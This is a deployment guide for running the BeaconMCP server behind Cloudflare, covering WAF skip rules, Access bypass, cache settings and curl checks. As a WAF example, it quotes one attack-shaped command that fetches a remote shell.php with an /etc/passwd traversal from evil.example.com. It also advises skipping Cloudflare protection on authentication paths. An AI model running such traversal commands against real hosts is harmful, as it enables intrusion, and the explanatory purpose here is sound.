# Running BeaconMCP behind Cloudflare

BeaconMCP works behind `cloudflared` (Cloudflare Tunnel) and the Cloudflare
proxy, but Cloudflare's default security posture **breaks MCP out of the box**.
MCP clients (Claude, ChatGPT, Assistant Desktop) are headless HTTP clients, not
browsers — Cloudflare's bot/WAF/Access defenses treat them as suspicious and
either block the request or strip the `Authorization` header before it reaches
BeaconMCP.

## Symptom

The MCP endpoint returns **401 or 403 only via the public Cloudflare URL** while
`curl http://localhost:8420/mcp` (on the box) works fine. If you see a 401 body
containing a `hint` that mentions `cf-ray`, BeaconMCP detected the request came
through Cloudflare with no usable bearer — a Cloudflare rule ate it.

A second, distinct symptom: a command **works until one of its arguments
contains an attack-shaped string** — a path like `/etc/passwd`, a traversal
`../../`, an `http://host/x.php?...` URL, or a SQL-ish quote — at which point you
get Cloudflare's full-page **"Sorry, you have been blocked"** HTML (with a Ray
ID), *not* a JSON 401/403. That is the OWASP Managed Ruleset, not auth: the
request is dropped at the edge and never reaches BeaconMCP, so there is no
server-side fix — only the WAF skip in §1. Verified against a live deployment:
`ssh_run` with `curl http://evil.example.com/shell.php?x=../../../../etc/passwd`
is blocked, while the same call with a plain URL or no URL is not.

## Why it happens

| Cloudflare feature | What it does to MCP |
|--------------------|---------------------|
| Bot Fight Mode / Super Bot Fight Mode / Browser Integrity Check | Challenges or blocks non-browser clients (MCP sends no browser headers) → **403 / challenge HTML** before the app sees the request. |
| WAF Managed Rules (OWASP CRS) | False-positive on a tool **argument** that pattern-matches an attack signature — path traversal (`../../`), `/etc/passwd`, an RFI/LFI URL (`http://host/x.php?...`), SQL-ish quotes. These appear constantly in legitimate infra commands (`cat /etc/passwd`, `grep -r ../`, `curl http://repo/file.tar.gz`), so Cloudflare serves its **"Sorry, you have been blocked"** HTML → **403** and BeaconMCP never sees the request. |
| Cloudflare Access | Sits in front of the hostname and **consumes/strips the `Authorization` header** (it owns that header for its own JWT) → BeaconMCP sees no bearer → **401**. |
| "Cache Everything" / buffering | Buffers or caches the streamable-HTTP / SSE response → the MCP stream hangs or returns stale data. |

All four are fixed below. Apply them to the **MCP and OAuth paths only** so the
rest of your zone keeps Cloudflare's protection.

---

## 1. WAF custom rule: skip bot/WAF protection for MCP + OAuth paths

**Dashboard:** *Security → WAF → Custom rules → Create rule* (per-zone).
For Bot Fight Mode skip on the legacy plan, the equivalent is *Security → Bots*;
on Free, prefer creating the skip rule below and disabling **Bot Fight Mode**
zone-wide if you cannot scope it.

Rule expression (copy-paste into the *Edit expression* box):

```
(starts_with(http.request.uri.path, "/mcp")) or (starts_with(http.request.uri.path, "/oauth/")) or (starts_with(http.request.uri.path, "/.well-known/"))
```

Action: **Skip**, and check every relevant box:

- Skip → **All remaining custom rules**
- Skip → **Managed rules** (WAF Managed Ruleset + OWASP)
- Skip → **Super Bot Fight Mode**
- Skip → **Browser Integrity Check**
- (if present) Skip → **Rate limiting rules**

Place this rule **first** in the custom-rules list so it short-circuits before
anything blocks the request.

> **What you give up, and what replaces it.** This rule removes Cloudflare's
> protection from your *authentication* endpoints, which is not a decision to
> make blindly. BeaconMCP enforces its own equivalents on those paths: a
> per-IP rate limit on `/oauth/token` and `/authorize`, a 5-strike / 5-minute
> TOTP lockout per client, and mandatory OAuth 2.1 + TOTP on every exchange.
> That is why skipping is safe *here* and only here — keep the expression
> anchored with `starts_with` so it can't widen to the rest of your zone.
> (`contains "/mcp"` would also match `/anything/mcp-foo`.)

> The paths cover the MCP endpoint (`/mcp`, `/mcp/c/<slug>`), the OAuth
> authorization/token/registration endpoints (`/oauth/...`), and RFC 9728 /
> RFC 8414 discovery (`/.well-known/...`). Discovery must be reachable
> unauthenticated or clients can't find your authorization server.

---

## 2. Cloudflare Access (Zero Trust) — exclude /mcp or pass the header through

If the hostname is protected by **Cloudflare Access**, Access owns the
`Authorization` header and strips the client's bearer. You have two options:

**A. Bypass Access for the MCP/OAuth paths (simplest).**
*Zero Trust → Access → Applications → your app → Policies* — add a **Bypass**
policy, or scope the application's path so it does **not** cover `/mcp`,
`/oauth/`, or `/.well-known/`. BeaconMCP enforces its own OAuth 2.1 + TOTP on
these paths, so Access in front of them is redundant and harmful.

**B. Keep Access but pass `Authorization` through.**
If you must keep Access on the path, ensure it does not consume the header:
use an Access **service token** for the automated client and confirm the
`Authorization: Bearer <BeaconMCP-token>` header survives to the origin (test
with the diagnostic in §5). In practice, **option A is strongly recommended** —
Access and BeaconMCP both want the `Authorization` header, and only one can win.

---

## 3. No caching / no buffering on /mcp

Streamable-HTTP and SSE must stream straight through. **Do not** apply
"Cache Everything" to the MCP path.

**Dashboard:** *Caching → Cache Rules → Create rule*:

- When incoming requests match: `(http.request.uri.path contains "/mcp")`
- Then: **Bypass cache**.

If you have a zone-wide "Cache Everything" Page Rule / Cache Rule, add the
bypass rule **above** it. Cloudflare does not buffer responses by default, but
an aggressive cache rule on this path will break the MCP transport.

---

## 4. BeaconMCP-side configuration

In `beaconmcp.yaml`:

```yaml
server:
  # The public hostname Cloudflare forwards to BeaconMCP. Without it the MCP
  # SDK rejects requests with 421 Misdirected Request (DNS-rebinding guard).
  allowed_hosts:
    - mcp.example.com
  # Trust Cloudflare's edge so X-Forwarded-For is honoured for auth rate
  # limiting. The literal "cloudflare" auto-expands to Cloudflare's IP ranges.
  trusted_proxies:
    - cloudflare
```

Restart BeaconMCP after editing. (Both also have env equivalents:
`BEACONMCP_ALLOWED_HOSTS`, `BEACONMCP_TRUSTED_PROXIES`.)

---

## 5. Verify

From your laptop (not the server), with a valid bearer:

```bash
# Discovery must be reachable unauthenticated (no challenge HTML, HTTP 200):
curl -i https://mcp.example.com/.well-known/oauth-protected-resource

# An unauthenticated /mcp POST should return a clean JSON 401 from BeaconMCP
# (NOT a Cloudflare challenge / "Just a moment..." HTML page):
curl -i -X POST https://mcp.example.com/mcp

# With a real bearer it should reach the app (no 403, header survives):
curl -i -X POST https://mcp.example.com/mcp \
     -H "Authorization: Bearer <your-token>" \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","id":1,"method":"ping"}'
```

Checks:

- A **403** or an HTML "Just a moment…" / "Checking your browser" page on any
  of the above → a bot/WAF rule is still blocking. Revisit §1.
- A **401** whose JSON body contains a `hint` about `cf-ray` even though you
  *did* send a valid bearer → Access/WAF stripped your `Authorization` header.
  Revisit §2. BeaconMCP logs the matching warning to
  `journalctl -u beaconmcp` (look for `cf-ray=` + "Cloudflare"). That warning
  is throttled to one line per 5 minutes — a public endpoint gets scanned
  constantly and every drive-by hit carries a `cf-ray` — so the line reports
  how many similar events it stands for rather than one line per request.
- A clean `401 {"error":"unauthorized"}` with no bearer, and a `200` with a
  valid bearer → everything is wired correctly.

## See also

- `docs/troubleshooting.md` — symptom/fix table.
- `README.md` → *Expose publicly* — `allowed_hosts` / `trusted_proxies`.
